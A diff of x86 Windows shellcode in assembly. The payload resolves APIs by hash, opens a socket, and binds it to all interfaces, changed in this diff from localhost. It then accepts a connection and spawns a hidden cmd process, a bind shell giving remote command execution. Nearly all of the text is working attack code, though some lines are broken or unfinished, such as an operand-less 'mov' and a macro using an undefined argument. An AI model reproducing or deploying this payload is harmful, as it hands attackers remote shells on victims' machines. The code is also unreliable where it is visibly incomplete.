@@ -29,8 +29,31 @@
 ;    
 
     bits   32
-        
-start:
+
+%macro crc32c 1.nolist
+  %assign %%h 0
+  %strlen %%len %1
+  %assign %%s 1
+  %rep %%len
+    %substr %%c %1 %%s
+    %assign %%c (%%c | 0x20)
+    %assign %%b (%%c ^ (%%h & 0xff))
+    %assign %%h (%%h >> 8)    
+    %rep 8
+      %assign %%b (%%b >> 1) ^ (0x82F63B78 * (%%b & 1)) 
+    %endrep
+    %assign %%h (%%h ^ %%b)
+    %assign %%s (%%s+1)
+  %endrep
+  dd %%h
+%endmacro
+
+; mov eax, HASH "string"
+%macro hmov 1.nolist
+  db 0B8h
+  crc32c %1 + crc32 %2
+%endmacro
+    
     push   ebx
     push   ebp
     push   edi
@@ -61,7 +84,7 @@ cfg_data:
     dd     0xA452DBF7   ; LoadLibraryA
     db     2 ; ok
     dd     0xC9854299   ; WSAStartup
-    db     6 ; 2 x 8 + 32 = 40, ok
+    db     6 ; ok
     dd     0x93192D14   ; WSASocketA
     db     3 ; ok 
     dd     0x17D94F96   ; bind
@@ -290,24 +313,35 @@ gapi_l6x:
     bits   32    
 
 rc_l2:    
-    add    esp, -256
-    mov    edi, esp
+int3
+    add    esp, -512    
+    push   esp
+    pop    edi
+    scasd               ; skip 4
 
     ; LoadLibraryA ("ws2_32");
+    xor    eax, eax
+    cdq
+    push   eax ; alloc 4 or 8 bytes
+    push   eax ; alloc 4 or 8 bytes
+    push   esp
+    pop    edx
     mov    eax, ~'32'
     not    eax
-    push   eax
-    push   'ws2_'
-    push   esp
+    mov    dword[edx+4], eax
+    mov    dword[edx], 'ws2_'
+    push   edx    
     call   ebp
-    pop    eax
-    pop    eax
+    pop    eax ; free 4 or 8 bytes
+    pop    eax ; free 4 or 8 bytes
     
     ; WSAStartup (MAKEWORD(2,0), &wsa);
     push   edi         ; &wsa
     push   2           ; MAKEWORD(2, 0)
     call   ebp
-
+    test   eax, eax
+    jnz    xit
+    
     ; WSASocket (AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
     push   eax         ; 0
     push   eax         ; 0
@@ -316,7 +350,10 @@ rc_l2:
     push   1           ; SOCK_STREAM
     push   2           ; AF_INET 
     call   ebp
+    test   eax, eax
+    js     xit
     
+    push   eax         ; put s on stack
     xchg   eax, ebx    ; ebx = s
 
     ; bind (s, (struct sockaddr*)&sa, sizeof(sa));
@@ -327,7 +364,7 @@ rc_l2:
     not    eax
     stosd
     
-    mov    eax, ~0x0100007F & 0xFFFFFFFF  ; 127.0.0.1
+    mov    eax, ~0x00000000 & 0xFFFFFFFF  ; 
     not    eax
     stosd
     
@@ -337,29 +374,37 @@ rc_l2:
     
     push   ebx         ; s
     call   ebp
+    test   eax, eax
+    jnz    cls_s
     
     ; listen (s, 0);
     push   eax
     push   ebx
     call   ebp
-    
+    test   eax, eax
+    jnz    cls_s
+        
     ; accept (s, 0, 0);
     push   eax
     push   eax
     push   ebx
     call   ebp
+    test   eax, eax
+    js     cls_s
     
-    push   ebx
+    push   eax ; put r on stack
     xchg   eax, ebx
     
     ; memset (&si, 0, sizeof(si));
     push   esp
     pop    edi
+    scasd ; skip r
     
     push   edi    
-    mov    al, 104     ; si.cb = sizeof(si); 
+    push   68
+    pop    eax       ; si.cb = sizeof(si); 
     stosd
-    mov    al, 100
+    mov    al, 64
     xchg   eax, ecx
     xor    eax, eax
     rep    stosb
@@ -388,16 +433,19 @@ rc_l6x:
 rc_l10x:    
     pop    edx
     
+    ;int3
+    
     ; CreateProcess (NULL, "cmd", NULL, NULL, 
     ;     TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     inc    dword[edx+ecx+45]
+    ;mov    dword[edx+44], 100h ;STARTF_USESTDHANDLES
     mov    eax, ~'cmd'
     not    eax
     push   edi
     stosd 
     pop    eax
     push   edi         ; &pi         
-    push   edx         ; &si
+    push   edx         ; &si   
     xor    ecx, ecx    ; ecx = NULL
 
     push   8
@@ -407,22 +455,29 @@ rc_l10x:
     push   ecx         ; NULL
     push   ecx         ; NULL
     push   edx         ; CREATE_NO_WINDOW
-    push   edx         ; TRUE
+    push   1           ; TRUE, has to be 1 for NT
     push   ecx         ; NULL
     push   ecx         ; NULL    
     push   eax         ; "cmd", 0
     push   ecx         ; NULL
     call   ebp
+    neg    eax
+    jns    cls_r
     
     ; WaitForSingleObject (pi.hProcess, INFINITE);
-    push   -1          ; INFINITE
+    push   eax         ; INFINITE
     mov    eax, [edi]
     push   eax         ; pi.hProcess
     call   ebp
-
-    ; closesocket (r);
-    push   ebx         ; r
+cls_r:
+    ; closesocket (s);
+    call   ebp      
+cls_s:
+    ; closesocket (s);
+    mov    
     call   ebp
-    
-    sub    esp, -256
+xit:    
+int3
+    sub    esp, -512
+    ;mov eax, [fs:0x34]
     ret    
